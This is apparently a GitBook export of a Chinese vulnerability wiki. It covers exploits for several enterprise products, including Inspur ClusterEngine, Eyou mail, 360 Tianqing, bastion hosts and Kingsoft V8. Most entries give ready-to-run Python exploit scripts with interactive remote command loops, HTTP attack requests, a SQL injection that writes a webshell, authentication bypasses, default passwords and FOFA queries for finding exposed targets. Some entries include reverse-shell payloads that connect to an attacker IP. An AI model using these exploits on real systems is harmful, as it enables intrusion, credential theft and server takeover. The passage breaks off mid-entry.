-*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 cat /etc/passwd>../../test.txt \\033[0m\".format(target_url)) if \"parent\" in response.text and response.status_code == 200: vuln_url = target_url + \"/test.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) if \"root:\" in response.text: print(\"\\033[36m[o] 成功执行 cat /etc/passwd, 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 请求失败:{} \\033[0m\") else: print(\"\\033[31m[x] 请求失败 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/天擎/":{"url":"book/Web应用漏洞/天擎/","title":"天擎","keywords":"","body":"天擎 天擎 数据库信息泄露漏洞 天擎 前台SQL注入 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/天擎/天擎 数据库信息泄露漏洞.html":{"url":"book/Web应用漏洞/天擎/天擎 数据库信息泄露漏洞.html","title":"天擎 数据库信息泄露漏洞","keywords":"","body":"天擎 数据库信息泄露漏洞 漏洞描述 天擎 存在未授权越权访问，造成敏感信息泄露 漏洞影响 [!NOTE] 天擎 漏洞复现 GET /api/dbstat/gettablessize HTTP/1.1 Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 360_Tianqing_database_information_disclosure 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/天擎/天擎 前台SQL注入.html":{"url":"book/Web应用漏洞/天擎/天擎 前台SQL注入.html","title":"天擎 前台SQL注入","keywords":"","body":"天擎 前台SQL注入 漏洞描述 天擎 存在SQL注入,攻击者可以通过漏洞上传木马 漏洞影响 [!NOTE] 天擎 FOFA [!NOTE] title=\"360新天擎\" 漏洞复现 注入写shell: https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('');copy O(T) to 'C:\\Program Files (x86)\\360\\skylar6\\www\\1.php';drop table O;-- 利用过程: 1. 通过安装包安装的一般都有root权限，因此该注入点可尝试写shell 2. 通过注入点，创建一张表 O 3. 为 表O 添加一个新字段 T 并且写入shell内容 4. Postgres数据库 使用COPY TO把一个表的所有内容都拷贝到一个文件(完成写shell) 5. 删除 表O 使用命令 sqlmap -u https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 360 TianQing ccid SQL injectable 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/亿邮/":{"url":"book/Web应用漏洞/亿邮/","title":"亿邮","keywords":"","body":"亿邮 亿邮电子邮件系统 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/亿邮/亿邮电子邮件系统 远程命令执行漏洞.html":{"url":"book/Web应用漏洞/亿邮/亿邮电子邮件系统 远程命令执行漏洞.html","title":"亿邮电子邮件系统 远程命令执行漏洞","keywords":"","body":"亿邮电子邮件系统 远程命令执行漏洞 漏洞描述 亿邮电子邮件系统 存在远程命令执行漏洞，攻击者可以执行任意命令 漏洞影响 [!NOTE] 亿邮电子邮件系统 FOFA [!NOTE] body=\"亿邮电子邮件系统\" 漏洞复现 登录页面如下 漏洞请求包如下 POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 39 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 type='|cat /etc/passwd||' 漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Eyou Email SYSTEM \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/webadm/?q=moni_detail.do&action=gragh\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"type='|cat /etc/passwd||'\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}//webadm/?q=moni_detail.do&action=gragh \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/webadm/?q=moni_detail.do&action=gragh\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"type='|{}||'\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, cmd) Goby & POC [!NOTE] Eyou Mail system RCE 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/安天/":{"url":"book/Web应用漏洞/安天/","title":"安天","keywords":"","body":"安天 安天 高级可持续威胁安全检测系统 越权访问漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/安天/安天 高级可持续威胁安全检测系统 越权访问漏洞.html":{"url":"book/Web应用漏洞/安天/安天 高级可持续威胁安全检测系统 越权访问漏洞.html","title":"安天 高级可持续威胁安全检测系统 越权访问漏洞","keywords":"","body":"安天 高级可持续威胁安全检测系统 越权访问漏洞 漏洞描述 安天 高级可持续威胁安全检测系统 存在越权访问漏洞，攻击者可以通过工具修改特定的返回包导致越权后台查看敏感信息 漏洞影响 [!NOTE] 安天 高级可持续威胁安全检测系统 FOFA [!NOTE] title=\"高级可持续威胁安全检测系统\" 漏洞复现 登录页面如下 其中抓包过程中发现请求的一个身份验证 Url {\"role\": \"\", \"login_status\": false, \"result\": \"ok\"} 其中 login_status 为 false, 将参数使用 Burp 替换响应包为 true 请求 /api/user/islogin 时成功越过身份验证 再次访问首页验证越权漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/思福迪堡垒机/":{"url":"book/Web应用漏洞/思福迪堡垒机/","title":"思福迪堡垒机","keywords":"","body":"思福迪堡垒机 思福迪堡垒机 任意用户登录漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/思福迪堡垒机/思福迪堡垒机 任意用户登录漏洞.html":{"url":"book/Web应用漏洞/思福迪堡垒机/思福迪堡垒机 任意用户登录漏洞.html","title":"思福迪堡垒机 任意用户登录漏洞","keywords":"","body":"思福迪堡垒机 任意⽤户登录漏洞 漏洞描述 思福迪堡垒机存在任意⽤户登录漏洞，恶意攻击者可以绕过堡垒机的密码登录验证机制，以任 意⽤户身份随意登录堡垒机Web管理界⾯，并可以正常的使⽤账户权限去操作。 漏洞影响 [!NOTE] 思福迪堡垒机 FOFA [!NOTE] \"Logbase运维安全管理系统\" 漏洞复现 获取INFO字段，u1参数值为⽤户名 POST /bhost/set_session HTTP/1.1 Host: xxx.xxx.xxx.xx u1=admin&m1= 获得：{\"result\":true,\"info\":\"1562205376847\",\"ErrMsg\":\"\"} 带⼊INFO字段进⼊如下请求的 a0 参数值中,uCode参数值为⽤户名 POST /bhost/login_link HTTP/1.1 Host: xxx.xxx.xxx.xxx a0=1562205376847&a1=&a10=2019-01- 01+10:10:10&ha=CADFDF26E649FB6284D2FD424BD294B6&uCode=admin&vdcode= 利用后即可登录后台 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/齐治堡垒机/":{"url":"book/Web应用漏洞/齐治堡垒机/","title":"齐治堡垒机","keywords":"","body":"齐治堡垒机 齐治堡垒机 任意用户登录漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/齐治堡垒机/齐治堡垒机 任意用户登录漏洞.html":{"url":"book/Web应用漏洞/齐治堡垒机/齐治堡垒机 任意用户登录漏洞.html","title":"齐治堡垒机 任意用户登录漏洞","keywords":"","body":"齐治堡垒机 任意用户登录漏洞 漏洞描述 齐治堡垒机 存在任意用户登录漏洞，访问特定的Url即可获得后台权限 漏洞影响 [!NOTE] 齐治堡垒机 FOFA [!NOTE] app=\"齐治科技-堡垒机\" 漏洞复现 漏洞POC为 http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 shterm(QiZhi) Fortress Arbitrary User Login 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/宝塔运维管理面板/":{"url":"book/Web应用漏洞/宝塔运维管理面板/","title":"宝塔运维管理面板","keywords":"","body":"宝塔运维管理面板 宝塔 phpmyadmin 未授权访问漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/宝塔运维管理面板/宝塔 phpmyadmin未授权访问漏洞.html":{"url":"book/Web应用漏洞/宝塔运维管理面板/宝塔 phpmyadmin未授权访问漏洞.html","title":"宝塔 phpmyadmin未授权访问漏洞.md","keywords":"","body":"宝塔 phpmyadmin未授权访问漏洞 漏洞描述 【宝塔面板】紧急安全更新通知，Linux面板7.4.2版本/Windows面板6.8版本存在安全隐患，其他版本无此风险。已发布紧急更新，请所有使用此版本的用户务必升级到最新版，更新方法，登录面板直接升级更新即可，如更新出现问题，请登录宝塔论坛反馈或者联系客服反馈 影响版本 [!NOTE] Linux正式版7.4.2 Linux测试版7.5.13 Windows正式版6.8 漏洞复现 访问 http://xxx.xxx.xxx.xxx:888/pma 即可 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/浪潮/":{"url":"book/Web应用漏洞/浪潮/","title":"浪潮","keywords":"","body":"浪潮 浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224 浪潮ClusterEngineV4.0 任意用户登录漏洞 浪潮ClusterEngineV4.0 sysShell 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/浪潮/浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224.html":{"url":"book/Web应用漏洞/浪潮/浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224.html","title":"浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224","keywords":"","body":"浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224 漏洞描述 浪潮服务器群集管理系统存在危险字符未过滤，导致远程命令执行 漏洞影响 [!NOTE] 浪潮ClusterEngineV4.0 FOFA [!NOTE] title=\"TSCEV4.0\" 漏洞复现 登录页面如下 由于登录页面没有发现验证码，进行账号爆破 当burpsuite爆破完成时，注意到POST数据中如果带有 ;' ，响应数据包发生异常。 通过响应包信息，猜测可能存在一个远程执行代码漏洞，并将此数据包放在repeater中，我发现如果发布数据中有 一个 ' ，系统将抛出异常。 进一步测试时，我发现username参数或password任一参数如果包含 ' ，将引发此异常 定尝试发送 ' ' 来查看响应包。 我注意到 grep 命令错误，服务端的代码可能是这样 var1 = `grep xxxx` var2 = $(python -c \"from crypt import crypt;print crypt('$username','$1$$var1')\") 尝试发送 -V 和 --help 来查看响应包，响应包证实了猜测 尝试读取 /etc/passswd 尝试列目录 确认存在一个远程执行命令执行漏洞，经过fuzz，得到以下payload 反弹 shell op=login&username=1 2\\',\\'1\\'\\); `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.16.11.81%2F80%200%3E%261` payload发送后, 在 kali linux 服务器上获取了一个 root 权限的 shell 上面是原文的测试思路，但经过重新测试之后发现还有另一种简单方法 POC测试(出现 root:x:0:0 则存在漏洞) op=login&username=test`$(cat /etc/passwd)` {\"err\":\"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\\n\",\"exitcode\":1,\"out\":\"the user test does not exist\\nerror:1\\n\"} 反弹shell op=login&username=test`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)` 漏洞利用POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 浪潮ClusterEngineV4.0 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mIP >>> xxx.xxx.xxx.xxx:9999 \\033[0m') print('+ \\033[36mPORT >>> 9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", } data = \"op=login&username=test`$(cat /etc/passwd)`\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=4) etc_passwd = re.findall(r'\\{\"err\":\"/bin/sh: (.*?): No such', response.text) if response.status_code == 200 and \"root:x:0:0\" in response.text: print(\"\\033[32m[o] 目标 {} 可能存在漏洞, 响应为:{} \\033[0m\".format(target_url, etc_passwd[0])) POC_2(target_url) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) def POC_2(target_url): IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) vuln_url = target_url + \"/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", } data = \"op=login&username=`bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261`\".format(IP, PORT) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!ONTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 ClusterEngineV4.0_RCE 参考文章 https://github.com/NS-Sp4ce/Inspur/tree/master/ClusterEngineV4.0%20Vul 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/浪潮/浪潮ClusterEngineV4.0 任意用户登录漏洞.html":{"url":"book/Web应用漏洞/浪潮/浪潮ClusterEngineV4.0 任意用户登录漏洞.html","title":"浪潮ClusterEngineV4.0 任意用户登录漏洞","keywords":"","body":"浪潮ClusterEngineV4.0 任意用户登录漏洞 漏洞描述 浪潮ClusterEngineV4.0 存在任意用户登录漏洞，构造恶意的用户名和密码即可获取后台权限 漏洞影响 [!NOTE] 浪潮ClusterEngineV4.0 FOFA [!NOTE] title=\"TSCEV4.0\" 漏洞复现 登录页面如下 USER： admin|pwd PASS: 任意 成功登陆后台 [!NOTE] 部分功能是无法使用的 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/浪潮/浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞.html":{"url":"book/Web应用漏洞/浪潮/浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞.html","title":"浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞","keywords":"","body":"浪潮ClusterEngineV4.0 sysShell 远程命令执行漏洞 漏洞描述 浪潮ClusterEngineV4.0 存在远程命令执行，攻击者通过发送特殊的请求可以获取服务器权限 漏洞影响 [!NOTE] 浪潮ClusterEngineV4.0 FOFA [!NOTE] title=\"TSCEV4.0\" 漏洞复现 登录页面如下 发送请求包 POST /sysShell HTTP/1.1 Host: xxx.xxx.xxx.xxx Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: lang=cn Cache-Control: max-age=0 Content-Length: 42 op=doPlease&node=cu01&command=cat /etc/passwd [!NOTE] 注意参数 node 中的 cu01 需要为shell集群中的存在主机 这里可以配合任意用户登录漏洞查看主机名 漏洞利用 [!NOTE] 如过出现 Name or service not 请通过上述的方法查看 shell集群主机的名称（脚本默认 cu01） import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: SonicWall SSL-VPN \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/sysShell\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Cookie\": \"lang=cn\" } data = \"op=doPlease&node=cu01&command=cat /etc/passwd\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/sysShell \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/sysShell\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Cookie\": \"lang=cn\" } data = \"op=doPlease&node=cu01&command={}\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, cmd) Goby & POC [!NOTE] ClusterEngine V4.0 Shell cluster RCE 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/和信创天云/":{"url":"book/Web应用漏洞/和信创天云/","title":"和信创天云","keywords":"","body":"和信创天云 和信创天云桌面系统 远程命令执行 RCE漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/和信创天云/和信创天云桌面系统 远程命令执行 RCE漏洞.html":{"url":"book/Web应用漏洞/和信创天云/和信创天云桌面系统 远程命令执行 RCE漏洞.html","title":"和信创天云桌面系统 远程命令执行 RCE漏洞","keywords":"","body":"和信创天云桌面系统 远程命令执行 RCE漏洞 漏洞描述 和信创天云桌面系统存在默认配置导致文件上传并可以远程命令执行 漏洞影响 [!NOTE] 和信创天云桌面系统 漏洞复现 登录页面如下 发送请求包如下 POST /Upload/upload_file.php?l=1 HTTP/1.1 Host: xxx.xxx.xx.xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8 Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv Content-Length: 182 ------WebKitFormBoundaryfcKRltGv Content-Disposition: form-data; name=\"file\"; filename=\"test.php\" Content-Type: image/avif ------WebKitFormBoundaryfcKRltGv-- 访问 http://xxx.xx.xxx.xxx/Upload/1/test.php 漏洞POC import requests import sys import random import base64 import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 和信云桌面任意文件上传漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/Upload/upload_file.php?l=test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\", \"Content-Type\": \"multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv\" } data = base64.b64decode(\"Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YKCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWZjS1JsdEd2CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSJ0ZXN0LnBocCIKQ29udGVudC1UeXBlOiBpbWFnZS9hdmlmCgo8P3BocCBwaHBpbmZvKCk7Pz4KLS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"Requst\" in response.text and response.status_code == 200: webshell_url = target_url + \"/Upload/test/config.php\" response = requests.get(url=webshell_url, headers=headers,verify=False, timeout=5) if \"shell\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 config.php\\n[o] 路径为 {}/Upload/test/config.php\\033[0m\".format(target_url, target_url)) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) else: print(\"\\033[31m[x] 上传失败 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/虚拟仿真实验室/":{"url":"book/Web应用漏洞/虚拟仿真实验室/","title":"虚拟仿真实验室","keywords":"","body":"虚拟仿真实验室 阿尔法科技 虚拟仿真实验室 未授权访问漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/虚拟仿真实验室/阿尔法科技 虚拟仿真实验室 未授权访问漏洞.html":{"url":"book/Web应用漏洞/虚拟仿真实验室/阿尔法科技 虚拟仿真实验室 未授权访问漏洞.html","title":"阿尔法科技 虚拟仿真实验室 未授权访问漏洞","keywords":"","body":"阿尔法科技 虚拟仿真实验室 未授权访问漏洞 漏洞描述 阿尔法科技 虚拟仿真实验室 存在未授权访问漏洞，通过访问构造的Url可以获取敏感信息 漏洞影响 [!NOTE] 虚拟仿真实验室 FOFA [!NOTE] body=\"河南阿尔法科技有限公司\" 漏洞复现 未授权的Url为 /admin/student/studentlist.html?page=1 成功获取所有用户的账号密码信息 参考文章 http://www.0dayhack.net/index.php/1702/ 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/金山/":{"url":"book/Web应用漏洞/金山/","title":"金山","keywords":"","body":"金山 金山 V8 终端安全系统 默认弱口令漏洞 金山 V8 终端安全系统 任意文件读取漏洞 金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/金山/金山 V8 终端安全系统 默认弱口令漏洞.html":{"url":"book/Web应用漏洞/金山/金山 V8 终端安全系统 默认弱口令漏洞.html","title":"金山 V8 终端安全系统 默认弱口令漏洞","keywords":"","body":"金山 V8 终端安全系统 默认弱口令漏洞 漏洞描述 金山 V8 终端安全系统 存在默认弱口令，攻击者可以获得全部主机权限 漏洞影响 [!NOTE] 金山 V8 终端安全系统 FOFA [!NOTE] app=\"猎鹰安全-金山V8+终端安全系统\" 漏洞复现 登陆页面如下 默认口令为 admin/admin 登录后获取全部的主机权限(包括进程查看，命令执行等) Goby & POC [!NOTE] Kingsoft V8 Default weak password 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/金山/金山 V8 终端安全系统 任意文件读取漏洞.html":{"url":"book/Web应用漏洞/金山/金山 V8 终端安全系统 任意文件读取漏洞.html","title":"金山 V8 终端安全系统 任意文件读取漏洞","keywords":"","body":"金山 V8 终端安全系统 任意文件读取漏洞 漏洞描述 金山 V8 终端安全系统 存在任意文件读取漏洞，攻击者可以通过漏洞下载服务器任意文件 漏洞影响 [!NOTE] 金山 V8 终端安全系统 FOFA [!NOTE] title=\"在线安装-V8+终端安全系统Web控制台\" 漏洞复现 存在漏洞的文件 /Console/htmltopdf/downfile.php 文件中没有任何的过滤 通过filename参数即可下载任意文件 POC为 http://xxx.xxx.xxx.xxx/htmltopdf/downfile.php?filename=downfile.php 漏洞POC import 